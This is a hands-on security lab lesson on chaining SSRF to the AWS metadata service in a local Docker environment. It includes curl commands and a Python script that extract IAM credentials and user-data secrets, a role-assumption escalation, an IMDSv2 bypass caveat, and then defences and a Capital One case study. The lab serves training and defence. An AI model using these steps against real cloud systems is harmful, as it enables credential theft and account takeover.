---
title: "SSRF to AWS Metadata Lab — IMDSv1 Extraction, Assume Role, Privilege Escalation"
tags: [SSRF, AWS, IMDS, metadata, IMDSv1, IMDSv2, credential-extraction, assume-role,
       lab, Docker, privilege-escalation, ATT&CK-T1552.005, Capital-One, CWE-918]
module: 04-BroadSurface-02
day: 184
related_topics:
  - SSRF Fundamentals (Day 113)
  - AWS IAM Fundamentals (Day 182)
  - IAM Misconfiguration Attacks (Day 183)
  - Cloud Hardening (Day 195)
---

# Day 184 — SSRF to AWS Metadata Lab

> "SSRF to the metadata endpoint is the defining cloud attack. Every cloud
> pentest I have ever run has included it as a test. Most come back positive
> because teams focus on the application layer and forget that the server
> itself has an unauthenticated credential API sitting at
> 169.254.169.254. You exploit the app. The app talks to the metadata.
> You walk out with cloud admin credentials."
>
> — Ghost

---

## Goals

By the end of this lab you will be able to:

1. Identify an SSRF vulnerability in a web application and pivot it to the
   AWS Instance Metadata Service.
2. Extract temporary IAM credentials from the metadata endpoint using
   IMDSv1 (no token required).
3. Use the extracted credentials to enumerate IAM permissions and identify
   escalation paths.
4. Assume a more privileged role using the stolen credentials.
5. Explain how IMDSv2 prevents this attack and what is required to bypass it.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| SSRF fundamentals | Day 113 |
| AWS IAM fundamentals | Day 182 |
| IAM misconfiguration attacks | Day 183 |
| Docker Compose | Days 150–151 |
| Python requests | Day 149 |

---

## Lab Setup

```bash
cd learn-security/04-BroadSurface-02/samples/ssrf-metadata-lab/
docker compose up --build -d

# Services:
# Vulnerable web app:  http://localhost:8080
# Mock IMDS endpoint:  http://localhost:9999  (simulates 169.254.169.254)
docker compose ps
```

### Lab Architecture

```
┌─────────────────────────────────────────────────────┐
│  Vulnerable Flask App (localhost:8080)               │
│                                                      │
│  GET /fetch?url=<URL>                                │
│    → Fetches the URL server-side (SSRF)              │
│    → No allowlist; fetches any URL including         │
│      http://169.254.169.254 (simulated on :9999)     │
└─────────────────────────────────────────────────────┘
              ↓ server-side HTTP request
┌─────────────────────────────────────────────────────┐
│  Mock IMDS Endpoint (simulates 169.254.169.254)      │
│  http://localhost:9999                               │
│                                                      │
│  GET /latest/meta-data/                              │
│  GET /latest/meta-data/iam/security-credentials/    │
│    → "web-app-role"                                  │
│  GET /latest/meta-data/iam/security-credentials/web-app-role
│    → Temporary credentials (AccessKey + SessionToken)│
│  GET /latest/user-data                               │
│    → Bootstrap script with DB password               │
└─────────────────────────────────────────────────────┘
```

### Docker Compose

```yaml
# docker-compose.yml
version: "3.9"
services:
  webapp:
    build: ./webapp
    ports: ["8080:8080"]
    environment:
      IMDS_ENDPOINT: "http://mock-imds:9999"
    networks: [lab-net]

  mock-imds:
    build: ./mock-imds
    networks:
      lab-net:
        aliases: ["169.254.169.254"]   # Alias matches real IMDS IP
    expose: ["9999"]

networks:
  lab-net:
```

---

## Objective 1 — Confirm SSRF

### Step 1.1 — Probe the Fetch Endpoint

```bash
# Does the app fetch external URLs?
curl -s "http://localhost:8080/fetch?url=http://httpbin.org/ip"
# → {"origin": "x.x.x.x"}   # Server IP — not your IP → SSRF confirmed

# Does it follow redirects?
curl -s "http://localhost:8080/fetch?url=http://httpbin.org/redirect-to?url=http://example.com"

# Can it reach internal hosts?
curl -s "http://localhost:8080/fetch?url=http://169.254.169.254/"
# → Or use the alias in the lab:
curl -s "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/"
```

Expected response:

```
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
hostname
iam/
instance-action
instance-id
...
```

---

## Objective 2 — Extract IAM Credentials

### Step 2.1 — Enumerate IAM Security Credentials

```bash
# Find attached role name
ROLE=$(curl -s "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/")
echo "Attached role: $ROLE"

# Retrieve temporary credentials for the role
CREDS=$(curl -s "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}")
echo "$CREDS" | python3 -m json.tool
```

Expected response:

```json
{
  "Code": "Success",
  "LastUpdated": "2024-01-01T10:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "AQoDYXdzEJr//////////wEa...",
  "Expiration": "2024-01-01T16:00:00Z"
}
```

### Step 2.2 — Extract User Data (Bonus Secret)

```bash
curl -s "http://localhost:8080/fetch?url=http://169.254.169.254/latest/user-data"
# → #!/bin/bash
# → DB_PASSWORD=SuperSecret123!
# → export RDS_HOST=prod-db.abc123.us-east-1.rds.amazonaws.com
```

---

## Objective 3 — Use Stolen Credentials

### Step 3.1 — Configure the Stolen Credentials

```python
# exploit_metadata.py
import requests
import json
import subprocess

SSRF_URL = "http://localhost:8080/fetch?url="
IMDS_BASE = "http://169.254.169.254/latest/meta-data"

def fetch_via_ssrf(path: str) -> str:
    resp = requests.get(f"{SSRF_URL}{IMDS_BASE}{path}")
    return resp.text

# 1. Get role name
role_name = fetch_via_ssrf("/iam/security-credentials/").strip()
print(f"[+] Role name: {role_name}")

# 2. Get credentials
creds_raw = fetch_via_ssrf(f"/iam/security-credentials/{role_name}")
creds = json.loads(creds_raw)
print(f"[+] Access Key ID: {creds['AccessKeyId']}")

# 3. Export credentials
import os
os.environ["AWS_ACCESS_KEY_ID"] = creds["AccessKeyId"]
os.environ["AWS_SECRET_ACCESS_KEY"] = creds["SecretAccessKey"]
os.environ["AWS_SESSION_TOKEN"] = creds["Token"]
os.environ["AWS_DEFAULT_REGION"] = "us-east-1"

# 4. Verify identity
result = subprocess.run(
    ["aws", "sts", "get-caller-identity"],
    capture_output=True, text=True
)
print(f"[+] Caller identity:\n{result.stdout}")
```

```bash
python3 exploit_metadata.py
```

### Step 3.2 — Enumerate What the Role Can Do

```bash
# Set environment variables (from the script output)
export AWS_ACCESS_KEY_ID="ASIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/..."
export AWS_SESSION_TOKEN="AQoDYXdzEJr..."

# What is this role's identity?
aws sts get-caller-identity

# What can the role do? Try common services
aws s3 ls                              # Can it list buckets?
aws s3 ls s3://target-bucket/         # Can it list contents?
aws iam list-roles 2>/dev/null         # Can it list IAM roles?
aws ec2 describe-instances 2>/dev/null # Can it see EC2 instances?
aws secretsmanager list-secrets 2>/dev/null  # Can it list secrets?
```

---

## Objective 4 — Privilege Escalation via Role Assumption

The `web-app-role` in this lab has `sts:AssumeRole` permission on the
`escalation-target-role` (which has admin access).

### Step 4.1 — Find Assumable Roles

```bash
# Try to list available roles
aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table 2>/dev/null

# Or: try to assume known role names directly
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/escalation-target-role \
  --role-session-name escalated-session 2>&1
```

### Step 4.2 — Assume the Higher-Privilege Role

```bash
ESCALATED=$(aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/escalation-target-role \
  --role-session-name escalated-session)

export AWS_ACCESS_KEY_ID=$(echo $ESCALATED | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $ESCALATED | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $ESCALATED | jq -r '.Credentials.SessionToken')

# Verify escalated identity
aws sts get-caller-identity
# → role/escalation-target-role

# Confirm admin access
aws iam list-users
aws s3 ls
aws ec2 describe-instances --region us-east-1
```

**Flag:** Read the S3 bucket `flag-bucket`:

```bash
aws s3 cp s3://flag-bucket/flag.txt -
# → FLAG{ssrf_imds_role_escalation}
```

---

## Part 5 — IMDSv2: How the Defence Works

IMDSv2 requires a session-oriented approach with a PUT request to obtain a
token before any metadata query. SSRF attacks that only allow GET requests
cannot obtain the token — the exploit fails.

### IMDSv2 Flow

```bash
# Step 1: Obtain a session token (requires PUT — SSRF-resistant)
TOKEN=$(curl -s -X PUT \
  "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use the token in subsequent requests
curl -s \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  -H "X-aws-ec2-metadata-token: $TOKEN"
```

**Why SSRF fails against IMDSv2:**

- Most SSRF vulnerabilities only allow GET requests (URL fetch, image load)
- PUT requests with custom headers are rarely possible through a URL-fetch SSRF
- Even if the application makes PUT requests, the token is bound to the IP
  that requested it — a relay from a different IP returns a 401

**IMDSv2 bypass caveat:** If the SSRF vulnerability allows:
1. Custom HTTP method (PUT)
2. Custom headers (`X-aws-ec2-metadata-token-ttl-seconds`)

Then IMDSv2 can still be bypassed. This is rare but possible via SSRF
through proxies like Nginx/HAProxy or via CRLF injection.

### Checking IMDSv2 Enforcement

```bash
# Check if IMDSv1 is still allowed on an EC2 instance
aws ec2 describe-instances \
  --query 'Reservations[*].Instances[*].MetadataOptions' \
  --output table
# HttpTokens: required → IMDSv2 only
# HttpTokens: optional → IMDSv1 still allowed (vulnerable)

# Enforce IMDSv2 on an existing instance
aws ec2 modify-instance-metadata-options \
  --instance-id i-0abcdef1234567890 \
  --http-tokens required \
  --http-endpoint enabled
```

---

## Part 6 — Real-World Case: Capital One 2019

**Breach summary:**

- An EC2-hosted WAF had an SSRF vulnerability in its configuration endpoint
- Attacker exploited SSRF to reach `169.254.169.254` (IMDSv1 — no token required)
- Extracted temporary credentials for the EC2 instance's IAM role
- The role had `s3:ListBuckets` and `s3:GetObject` on all buckets
- Attacker downloaded 106 million customer records from 700+ S3 buckets
- Exfiltration went undetected for months — no CloudTrail alerting on bulk S3 GetObject

**What would have stopped it:**

| Control | Effect |
|---|---|
| IMDSv2 required | SSRF GET request cannot obtain token → credential extraction fails |
| Least-privilege role | Role should only access the buckets used by the WAF, not all 700+ |
| CloudTrail + GuardDuty | Bulk S3 GetObject from unusual source → alert within minutes |
| S3 server-side encryption with CMK | Even with keys, decryption requires additional KMS permission |

---

## Key Takeaways

1. **IMDSv1 + SSRF = instant credential extraction.** The metadata endpoint
   requires no authentication. Any server-side HTTP request that reaches
   `169.254.169.254` returns cloud credentials.
2. **The extracted credentials are temporary but sufficient.** Valid for 1–12
   hours, they allow all actions permitted by the attached IAM role. An
   overly permissive role = full account takeover.
3. **IMDSv2 prevents the attack — but only if enforced.** Default AWS
   configurations in older accounts have `HttpTokens: optional` (IMDSv1
   allowed). Remediation requires explicitly setting `HttpTokens: required`.
4. **SSRF to metadata is one step; role assumption is step two.** Even a
   limited role can be chained to a more permissive role if the trust policy
   allows it.
5. **User data is a second credential source.** Bootstrap scripts in EC2
   user data frequently contain database passwords, API keys, and SSH keys —
   all readable via SSRF to `/latest/user-data`.

---

## Exercises

1. Extend the exploit script from Objective 3 to also read user data and
   extract any secrets found (look for patterns: `PASSWORD=`, `KEY=`,
   `SECRET=`, `TOKEN=`). Output a clean summary of credentials found.
2. Modify the lab's web application to require IMDSv2 (use `put_metadata_token`
   in the Flask mock-IMDS or simulate the token check). Verify that the
   Objective 2 SSRF no longer returns credentials.
3. Research: list three additional metadata paths beyond IAM credentials that
   are valuable to an attacker. For each: what is the path, what data does it
   return, and how can it be used in an attack?
4. Write a CloudTrail-based detection rule (as a Sigma rule or as an AWS
   EventBridge rule) that alerts when credentials with a `SessionToken`
   (temporary credentials from IMDS) are used from an IP address that is
   not in the AWS EC2 IP range. What does this detect?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q184.1, Q184.2 …).
> Follow-up questions use hierarchical numbering (Q184.1.1, Q184.1.2 …).

---

## Navigation

← Previous: [Day 183 — IAM Misconfiguration Attacks](DAY-0183-IAM-Misconfiguration-Attacks.md)
→ Next: [Day 185 — S3 Misconfiguration Lab](DAY-0185-S3-Misconfiguration-Lab.md)
